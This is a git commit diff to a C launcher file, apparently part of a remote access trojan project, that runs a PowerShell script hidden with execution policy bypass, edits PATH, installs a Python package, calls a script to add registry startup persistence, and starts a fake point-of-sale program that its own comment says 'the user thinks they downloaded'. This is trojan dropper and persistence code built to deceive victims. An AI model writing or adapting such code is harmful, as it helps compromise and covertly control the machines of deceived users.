f2508714b9c97718b4c9a774627903c84dfa7862
STUPID-AF-CAT <geddy@waveville.net>
2020-02-03 13:38:27 -0600

    Not sure why the first commit didn't work

--- persistence/auto_start.c
+++ persistence/auto_start.c
@@ -13,11 +13,10 @@ and triggering add_startup.py so that pos.py runs on startup.
 int main()
 {
     system("start /WAIT powershell.exe -executionpolicy bypass -windowstyle hidden -noninteractive -nologo -file \"Initialize_v1.ps1\""); //powershell script that checks if python is installed
-    system("setx path \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\\"");
-    system("setx path \"%PATH%;%homepath%\\AppData\\Local\\Programs\\Python\\Python38-32\\Scripts\\\""); //adds the right path for pip
+    system("setx path \"%PATH%;C:\\Python38\\\"");
+    system("setx path \"%PATH%;C:\\Python38\\Scripts\\\""); //adds the right path for pip
     system("start /WAIT pip install openpyxl\n"); //openpyxl is needed to run pos.py
-    system("setx path \"%PATH%;%homepath%\\Desktop\\TEAMPROJRAT-master\\UDP_Connection\\\"");
     system("python .\\persistence\\add_startup.py\n"); //starts the registry editing py file after python is installed
-    system("python .\\UDP_Connection\\python pos.py\n"); //starts the POS the user thinks they downloaded
+    system("python .\\UDP_Connection\\python pos.pyw\n"); //starts the POS the user thinks they downloaded
     return 0;
 }
